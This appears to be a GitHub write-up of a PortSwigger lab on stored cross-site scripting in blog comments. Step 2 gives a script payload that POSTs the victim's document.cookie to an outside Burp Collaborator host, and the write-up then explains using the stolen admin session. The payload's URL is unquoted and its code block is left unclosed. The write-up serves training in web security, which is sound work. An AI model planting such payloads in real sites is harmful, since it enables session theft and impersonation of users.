# XSS - Exploiting cross-site scripting to steal cookies

## 📌 Lab Details
- **Title**: Exploiting cross-site scripting to steal cookies
- **Difficulty**: Practitioner
- **Category**: Cross-site Scripting
- **Lab URL**: https://portswigger.net/academy/labs/launch/0c567d752c198d06a7a3e449249118740a13247871b21c6aab286522fe52f6aa?referrer=%2fweb-security%2fcross-site-scripting%2fexploiting%2flab-stealing-cookies

## 🔍 Summary
This lab has a stored XSS in blog comments. Inject a script that sends the victim's session cookie to Burp Collaborator. When the admin views the comment, their cookie is stolen. Use that cookie to impersonate the admin and access `/my-account` to solve the lab.

## 🛠 Steps to Solve
1. Open **Burp Collaborator** and copy the URL: `q8z4bhubwqpi7ycna7wamc2kbbh25sth.oastify.com`
2. Inject the exploit comment:
   ```sh
   <script>
   fetch(https://q8z4bhubwqpi7ycna7wamc2kbbh25sth.oastify.com, {
   method: 'POST',
   mode: 'no-cors',
   body: document.cookie
   });
   </script>
3. Once the admin loads the comment, the script runs thier **browser**, and sends **their cookie** to Burp Collaborator.
4. Click **Poll now** in the Burp Collaborator.
5. Use the **admin's session cookie** to log in to the account.
   
## 📖 Key Takeaways
- **Burp Collaborator** lets you recieve external requests from victims.
- `document.cookie` gives you the victim's session if JavaScript runs.
- If you have someone's session cookie, you can impersonate them.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/bf13b1a8-3422-4da8-9861-df9ec7a1779b)
![image](https://github.com/user-attachments/assets/200abf6c-33a8-4cfb-bf31-9b7c1e374424)
![image](https://github.com/user-attachments/assets/92581280-29ab-4b83-a747-57a8a3040f54)
![image](https://github.com/user-attachments/assets/713bfd1d-b176-4fbf-b683-11926b764eda)
![image](https://github.com/user-attachments/assets/12f39fde-e901-4ee6-9986-ebb118671c69)
